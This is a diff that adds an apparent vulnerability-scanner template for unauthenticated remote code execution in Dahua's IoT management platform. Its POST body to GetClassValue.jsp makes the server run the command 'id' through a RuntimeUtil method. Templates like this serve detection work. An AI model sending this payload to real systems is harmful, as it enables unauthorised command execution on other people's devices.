@@ -1,0 +1,31 @@
+id: dahua-icc-getclassvalue-rce
+brief:
+    title: Dahua 'GetClassValue' - Remote Code Execution
+    by: ProjectDiscoveryAI
+    level: critical
+    about: Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.
+    label:
+        - rce
+        - java
+        - dahua
+        - iot
+        - unauth
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/evo-apigw/admin/API/Developer/GetClassValue.jsp'
+      head:
+        Content-Type: application/json
+      body: |-
+        {
+            "data": {
+                "clazzName": "com.dahua.admin.util.RuntimeUtil",
+                "methodName": "syncexecReturnInputStream",
+                "fieldName": ["id"]
+            }
+        }
+      signs:
+        - "on": status
+          status:
+            - 200
